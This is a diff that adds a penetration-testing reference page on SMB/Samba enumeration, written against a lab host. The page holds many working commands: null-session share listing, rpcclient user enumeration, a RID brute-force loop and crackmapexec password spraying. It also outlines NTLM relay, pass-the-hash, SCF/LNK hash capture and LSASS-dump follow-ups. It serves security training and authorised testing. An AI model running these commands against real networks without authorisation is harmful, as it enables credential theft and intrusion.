@@ -1,0 +1,487 @@
+---
+title: SMB
+description: Server Message Block / CIFS footprinting - null session enumeration, share listing, RID brute-force, user discovery via RPC, and the smbclient / rpcclient / smbmap / crackmapexec / enum4linux-ng tool chain.
+mitre: [T1046, T1135, T1087.001, T1087.002, T1021.002, T1133]
+d3fend: [D3-NTA, D3-IDA]
+impact: [FileRead, FileWrite, CredentialTheft, InternalAccess]
+noise: moderate
+sidebar:
+  order: 3
+  label: SMB
+---
+
+## TL;DR
+
+SMB (Server Message Block) is the Windows file-and-printer-sharing protocol; Samba is the Linux/Unix open-source implementation that speaks the same wire format. SMB enumeration is usually the highest-yield activity in an internal Windows environment - null sessions, anonymously readable shares, and RID-based user enumeration produce a steady stream of credentials and intel.
+
+```
+# 1. Service detection
+nmap -sV -sC -p139,445 <target>
+
+# 2. List shares anonymously (null session)
+smbclient -N -L //<target>
+smbmap -H <target>
+crackmapexec smb <target> --shares -u '' -p ''
+
+# 3. RPC enumeration (users, groups, share info)
+rpcclient -U "" -N <target>
+> srvinfo
+> enumdomusers
+> queryuser 0x3e8
+
+# 4. Connect to a specific share
+smbclient //<target>/<share>
+
+# 5. Bulk enumeration with enum4linux-ng
+enum4linux-ng -A <target>
+```
+
+Success indicator: a list of shares with their access permissions, user accounts with their RIDs, group memberships, password policy, and (often) file contents from anonymously readable shares.
+
+## Protocol overview
+
+SMB runs over TCP and provides file/printer sharing, named pipes, and remote administration. Hierarchy of standards worth keeping straight:
+
+| Term | Meaning |
+| --- | --- |
+| **SMB1 / CIFS** | Original protocol. Insecure (no message signing, weak auth). Deprecated. Ports 137/138/139 (NetBIOS) + 445. |
+| **SMB2** | Microsoft's rewrite, introduced with Vista/2008. Drops NetBIOS dependency. Port 445. |
+| **SMB3** | Introduced with Windows 8/2012. Adds encryption, multi-channel. Port 445. |
+| **NetBIOS** | Older session layer SMB1 rode on top of. Ports 137 (name service, UDP), 138 (datagrams, UDP), 139 (session, TCP). |
+| **Samba** | Linux/BSD implementation of SMB. Configured via `/etc/samba/smb.conf`. |
+| **CIFS** | Marketing name Microsoft applied to SMB1. Often used interchangeably with "SMB1". |
+
+Modern Windows uses SMB2/3 on 445. Legacy systems and Linux Samba installs often still listen on 139 too. SMB1 should be disabled everywhere; finding it enabled is itself a finding (EternalBlue, EternalRomance, etc.).
+
+### Authentication models
+
+| Model | Where used |
+| --- | --- |
+| **Null session** | Anonymous, no creds. Used to be the default; disabled by default since XP SP2 / Server 2003 but still common on misconfigured Samba |
+| **Local user** | Credentials are validated against the local SAM database |
+| **Domain user** | Credentials are validated against a domain controller via Kerberos or NTLM |
+| **Guest** | Maps to an anonymous-like context if `map to guest = bad user` is set |
+
+The "shares" SMB exposes are named directory trees. Default administrative shares on Windows:
+
+| Share | Purpose |
+| --- | --- |
+| `ADMIN$` | `C:\Windows` for admin remote management |
+| `C$`, `D$`, etc. | Disk-volume shares for admins |
+| `IPC$` | Inter-process communication / RPC named pipes |
+| `PRINT$` | Printer drivers |
+| `NETLOGON`, `SYSVOL` | Domain controller shares (group policy, scripts) |
+
+## Default configuration - Samba
+
+Samba's main config (`/etc/samba/smb.conf`) has two sections: `[global]` and per-share `[name]` sections. Defaults filtered:
+
+```ini
+[global]
+   workgroup = DEV.INFREIGHT.HTB
+   server string = DEVSMB
+   log file = /var/log/samba/log.%m
+   max log size = 1000
+   logging = file
+
+   server role = standalone server
+   obey pam restrictions = yes
+   unix password sync = yes
+
+   map to guest = bad user        # Failed logins become guest sessions
+   usershare allow guests = yes   # Allow guest access to user-created shares
+
+[printers]
+   browseable = no
+   path = /var/spool/samba
+   printable = yes
+   read only = yes
+```
+
+Per-share settings worth recognizing:
+
+| Setting | Description |
+| --- | --- |
+| `[sharename]` | Section header - name as it appears in `smbclient -L` |
+| `workgroup` | Workgroup/domain seen by clients |
+| `path` | Server-side filesystem path |
+| `browseable = yes` | Share appears in the share-list (otherwise hidden but reachable if name is known) |
+| `guest ok = yes` | Allows connection without credentials |
+| `read only = yes/no` | Restricts/allows write |
+| `writable = yes` | Inverse of `read only` |
+| `create mask = 0700` | umask for newly-created files |
+| `map to guest = bad user` | How unauthenticated users are handled |
+
+## Dangerous settings
+
+| Setting | Why it's bad |
+| --- | --- |
+| `guest ok = yes` | Unauthenticated read access |
+| `writable = yes` + `guest ok = yes` | Unauthenticated write access - disastrous |
+| `browseable = yes` (on internal shares) | Helps the attacker discover what's available |
+| `create mask = 0777` | New files are world-writable |
+| `directory mask = 0777` | New dirs are world-writable |
+| `enable privileges = yes` | Honors per-SID privileges, useful for chaining |
+| `logon script = script.sh` | Runs on user login - chain target if you can write to the share |
+| `magic script = script.sh` | Runs when a script in the share closes - even worse |
+
+A textbook misconfigured share for a "team scratch space":
+
+```ini
+[notes]
+    comment = CheckIT
+    path = /mnt/notes/
+    browseable = yes
+    read only = no
+    writable = yes
+    guest ok = yes
+    enable privileges = yes
+    create mask = 0777
+    directory mask = 0777
+```
+
+That's unauthenticated read/write to `/mnt/notes/`. If `/mnt/notes/` happens to contain anything sensitive (backups, scripts, credentials), it's a finding. If you can write a script there and a magic-script/logon-script setting triggers it, you've got code execution.
+
+## Footprinting commands
+
+### Service detection
+
+```shell
+sudo nmap 10.129.14.128 -sV -sC -p139,445
+```
+
+```
+PORT    STATE SERVICE     VERSION
+139/tcp open  netbios-ssn Samba smbd 4.6.2
+445/tcp open  netbios-ssn Samba smbd 4.6.2
+Host script results:
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2021-09-19T13:16:04
+```
+
+Two important findings here:
+
+- **Message signing is "enabled but not required"** - this means SMB relay attacks remain feasible. Required-signing breaks relay.
+- **Samba 4.6.2** - version disclosure. Cross-reference with [CVE list for Samba](https://www.cvedetails.com/product/171/Samba-Samba.html).
+
+### Anonymous share listing
+
+`smbclient -N -L` enumerates shares using a null session:
+
+```shell
+smbclient -N -L //10.129.14.128
+```
+
+```
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        home            Disk      INFREIGHT Samba
+        dev             Disk      DEVenv
+        notes           Disk      CheckIT
+        IPC$            IPC       IPC Service (DEVSM)
+SMB1 disabled -- no workgroup available
+```
+
+`SMB1 disabled` is a good defensive sign. The four user-defined shares (`home`, `dev`, `notes`, plus `print$` and `IPC$`) are all worth probing.
+
+### Connecting to a share
+
+```shell
+smbclient //10.129.14.128/notes
+```
+
+```
+Enter WORKGROUP\<username>'s password:        # blank works for guest
+Anonymous login successful
+Try "help" to get a list of possible commands.
+smb: \>
+```
+
+The shell that opens has FTP-like commands:
+
+| Command | Action |
+| --- | --- |
+| `ls` | Directory listing |
+| `cd <dir>` | Change directory |
+| `get <file>` | Download |
+| `put <local> <remote>` | Upload |
+| `mget *.txt` | Multi-get with glob |
+| `mput *` | Multi-put |
+| `!<cmd>` | Run local shell command |
+| `recurse ON` + `prompt OFF` + `mget *` | Recursive bulk download |
+| `tarmode` | Toggle tar-format transfers (useful for large dirs) |
+| `allinfo <file>` | All metadata for a file |
+| `getfacl <file>` | ACLs |
+
+### RPC enumeration via rpcclient
+
+`rpcclient` exposes the [MS-RPC](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/) interfaces SMB rides on top of. Anonymous binding:
+
+```shell
+rpcclient -U "" -N 10.129.14.128
+```
+
+```
+rpcclient $>
+```
+
+Useful queries:
+
+| Query | What it returns |
+| --- | --- |
+| `srvinfo` | Server name, OS version, server type |
+| `enumdomains` | Domain names the server knows about |
+| `querydominfo` | Server role, total users, total groups |
+| `netshareenumall` | All shares (sometimes more than `smbclient -L` shows) |
+| `netsharegetinfo <share>` | Share-specific info including ACLs |
+| `enumdomusers` | List of users with their RIDs |
+| `queryuser <RID>` | Details for a single user |
+| `enumdomgroups` | Domain groups with their RIDs |
+| `querygroup <RID>` | Group details and member count |
+| `enumalsgroups domain` | Domain-local groups |
+| `enumalsgroups builtin` | Built-in groups (Administrators, Users, Guests, ...) |
+| `lookupnames <name>` | Resolve a name to a SID |
+| `lookupsids <sid>` | Resolve a SID to a name |
+
+Example session:
+
+```
+rpcclient $> srvinfo
+        DEVSMB         Wk Sv PrQ Unx NT SNT DEVSM
+        platform_id     :       500
+        os version      :       6.1
+        server type     :       0x809a03
+
+rpcclient $> enumdomusers
+user:[mrb3n] rid:[0x3e8]
+user:[cry0l1t3] rid:[0x3e9]
+
+rpcclient $> queryuser 0x3e9
+        User Name   :   cry0l1t3
+        Full Name   :   cry0l1t3
+        Home Drive  :   \\devsmb\cry0l1t3
+        ...
+        Password last set Time   : Wed, 22 Sep 2021 17:50:56 CEST
+        Password must change Time: Thu, 14 Sep 30828 04:48:05 CEST   # = never
+        user_rid :      0x3e9
+        group_rid:      0x201
+        bad_password_count:     0x00000000
+        logon_count:    0x00000000
+```
+
+`Password must change Time` of year 30828 = "never expires" - flag for the report.
+
+### RID brute-force
+
+When `enumdomusers` is blocked but `queryuser <RID>` is allowed, brute-force RIDs:
+
+```shell
+for i in $(seq 500 1100); do
+  rpcclient -N -U "" 10.129.14.128 \
+    -c "queryuser 0x$(printf '%x\n' $i)" 2>/dev/null \
+    | grep "User Name\|user_rid\|group_rid" && echo
+done
+```
+
+Output:
+
+```
+        User Name   :   sambauser
+        user_rid :      0x1f5
+        group_rid:      0x201
+
+        User Name   :   mrb3n
+        user_rid :      0x3e8
+        group_rid:      0x201
+
+        User Name   :   cry0l1t3
+        user_rid :      0x3e9
+        group_rid:      0x201
+```
+
+RIDs to know:
+
+| RID (hex) | Account |
+| --- | --- |
+| `0x1f4` (500) | Administrator (built-in) |
+| `0x1f5` (501) | Guest |
+| `0x1f6` (502) | KRBTGT (DCs only) |
+| `0x3e8` (1000) | First user-created account |
+| `0x3e9+` (1001+) | Sequential user accounts |
+
+The Impacket equivalent - `samrdump.py` - does the same enumeration in one command:
+
+```shell
+samrdump.py 10.129.14.128
+```
+
+### enum4linux-ng
+
+The catch-all SMB enumerator. Runs most of the above queries automatically:
+
+```shell
+enum4linux-ng 10.129.14.128 -A
+```
+
+Sections produced:
+
+- Service scan (LDAP, SMB over NetBIOS, SMB direct)
+- NetBIOS names and workgroup
+- SMB dialect check (which SMB versions are negotiable)
+- RPC session check (null session? random-user session?)
+- Domain info via RPC
+- OS information
+- User enumeration (`querydispinfo` + `enumdomusers`)
+- Group enumeration
+- Share enumeration with read/write tests
+- Password policy
+- Printer enumeration
+
+Sample useful output sections:
+
+```
+========================================
+|    Policies via RPC for 10.129.14.128 |
+========================================
+domain_password_information:
+  min_pw_length: 5
+  max_pw_age: 49710 days  (= no expiration)
+  pw_properties:
+  - DOMAIN_PASSWORD_COMPLEX: false        # weak passwords allowed
+  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false
+domain_lockout_information:
+  lockout_threshold: None                  # = no account lockout
+```
+
+`lockout_threshold: None` and `DOMAIN_PASSWORD_COMPLEX: false` together mean you can brute-force usernames you found without lockout protection and weak passwords are accepted. Combined with the user list from `enumdomusers`, this is a password-spray setup.
+
+### smbmap
+
+`smbmap` is share-focused - fast triage of "what can I see?" across many shares:
+
+```shell
+smbmap -H 10.129.14.128
+```
+
+```
+[+] User SMB session established on 10.129.14.128...
+[+] IP: 10.129.14.128:445       Name: 10.129.14.128
+        Disk                                            Permissions     Comment
+        ----                                            -----------     -------
+        print$                                          NO ACCESS       Printer Drivers
+        home                                            NO ACCESS       INFREIGHT Samba
+        dev                                             NO ACCESS       DEVenv
+        notes                                           READ,WRITE      CheckIT     # <-- 
+        IPC$                                            NO ACCESS       IPC Service
+```
+
+With credentials:
+
+```shell
+smbmap -H 10.129.14.128 -u cry0l1t3 -p P455w0rD!
+smbmap -H 10.129.14.128 -u cry0l1t3 -p P455w0rD! -R notes        # recursive listing
+smbmap -H 10.129.14.128 -u cry0l1t3 -p P455w0rD! -A pw -R notes  # find files matching pattern
+```
+
+### crackmapexec / netexec
+
+`crackmapexec` (renamed to `netexec` in newer distributions) does many things; for SMB:
+
+```shell
+# Anonymous enumeration
+crackmapexec smb 10.129.14.128 --shares -u '' -p ''
+
+# Credentialed enumeration
+crackmapexec smb 10.129.14.128 -u cry0l1t3 -p P455w0rD! --shares --users --groups
+
+# Spray a single password against a list of users
+crackmapexec smb 10.129.14.128 -u users.txt -p 'Winter2024!' --continue-on-success
+
+# Across a subnet
+crackmapexec smb 10.129.14.0/24 -u cry0l1t3 -p P455w0rD!
+```
+
+The subnet form is invaluable for password-reuse checks. If the local Administrator hash from one host works on twenty others, you've just mapped a lateral-movement path.
+
+### Tracking your own connection
+
+From the server side:
+
+```shell
+smbstatus
+```
+
+```
+Samba version 4.11.6-Ubuntu
+PID   Username   Group    Machine                    Protocol  Encryption  Signing
+75691 sambauser  samba    10.10.14.4 (ipv4:...:45564) SMB3_11   -           -
+
+Service  pid    Machine     Connected at
+notes    75691  10.10.14.4  Do Sep 23 00:12:06 2021 CEST
+```
+
+If you're testing on a host you control (or have shelled), this shows who's connected - useful to confirm your own sessions vs. real users.
+
+## Common findings from SMB enumeration
+
+| Finding | Path to it |
+| --- | --- |
+| **Anonymous share access** | `smbclient -N -L //target` shows shares; `smbclient //target/sharename` connects |
+| **Credentials in files** | After connecting to a share, search downloaded content for `password`, `apikey`, `secret`, etc. |
+| **SYSVOL Group Policy Preferences** (cpassword) | DC SYSVOL share, `*.xml` files. Decrypt with [gpp-decrypt](https://github.com/leonteale/pentestpackage/blob/master/gpp-decrypt.py) - the AES key is publicly known. |
+| **Service account credentials** | Backup files, deployment scripts, automation tooling on internal shares |
+| **User enumeration** | `enumdomusers` or RID brute = full user list for spray attacks |
+| **Weak password policy** | enum4linux-ng output → no lockout + low min length = spray-friendly |
+| **Outdated SMB1** | nmap script output → potential EternalBlue (MS17-010) target |
+
+## Common chained workflows
+
+**Anonymous → user list → password spray:**
+1. `enum4linux-ng -A target` → harvest usernames
+2. Build common password list (`Winter2024!`, `Welcome1`, `Password123`, company-name-based)
+3. `crackmapexec smb target -u users.txt -p passwords.txt`
+4. Validate any hits against other services (RDP, WinRM, the rest of the network)
+
+**Share write access → code execution:**
+1. Find writable share via `smbmap`
+2. Identify what consumes files from the share (Windows host with autorun script, scheduled task, web app pulling files)
+3. Place payload tailored to the consumer
+4. Trigger and catch the callback
+
+**SMB hash relay (with broader engagement scope):**
+1. Find a host where `Message signing is not required` (from nmap output)
+2. Identify other hosts where the same admin authenticates
+3. Relay NTLM auth via `ntlmrelayx.py` to gain access without cracking the hash
+
+## Quick reference
+
+| Task | Command |
+| --- | --- |
+| Banner + script scan | `nmap -sV -sC -p139,445 <target>` |
+| List shares (anon) | `smbclient -N -L //<target>` |
+| List shares (auth) | `smbclient -U user%pass -L //<target>` |
+| Connect to share | `smbclient //<target>/<share>` |
+| Connect with creds | `smbclient -U user%pass //<target>/<share>` |
+| RPC null session | `rpcclient -U "" -N <target>` |
+| Enum users via RPC | `rpcclient $> enumdomusers` |
+| RID brute-force | `for i in $(seq 500 1100); do rpcclient -N -U "" <target> -c "queryuser 0x$(printf '%x' $i)" ; done` |
+| Impacket user dump | `samrdump.py <target>` |
+| Share permissions | `smbmap -H <target>` |
+| Full enumeration | `enum4linux-ng -A <target>` |
+| Credentialed cme | `crackmapexec smb <target> -u user -p pass --shares` |
+| Password spray | `crackmapexec smb <target> -u users.txt -p 'Spring2024!' --continue-on-success` |
+
+## Next move
+
+- **Null session works, got share list / users** → enumerate every readable share (`smbclient //target/SHARE -N`) - `SYSVOL` on a DC contains GPP `cpassword` (instant credentials), file shares often have backup scripts, configs with embedded creds
+- **Null session blocked, got valid credentials** → re-enumerate with auth (`nxc smb target -u USER -p PASS --shares`), then try [WinRM](/codex/network/services/) (5985/5986) and [WMI](/codex/network/services/wmi/) for command execution
+- **Have NT hash, no plaintext** → pass-the-hash with `nxc smb target -u USER -H HASH` - same enumeration, no cracking needed
+- **`Pwn3d!` from `nxc`** → local admin on the host; pivot to [SeDebugPrivilege → LSASS dump](/codex/windows/privesc/sedebugprivilege/) or `secretsdump.py -just-dc-user` if it's a DC
+- **Got SYSVOL access on a DC** → search for `Groups.xml` in `SYSVOL/<domain>/Policies/*/Machine/Preferences/Groups/` - contains GPP cpassword (AES-decryptable to plaintext)
+- **Have `\\SHARE` write access** → drop a SCF or LNK file with UNC path to attacker host - captures NTLM hashes from any user browsing the share (Responder/ntlmrelayx)
+- **SMB signing disabled on target** → set up NTLM relay (`ntlmrelayx.py -tf targets.txt -smb2support`) - Responder feeds captured hashes into the relay chain
+- **No null session, no creds, no relay** → password-spray common usernames (`administrator`, `guest`, service account names from public records), or pivot to [LDAP / Kerberoasting](/codex/network/services/) (forthcoming AD cluster)
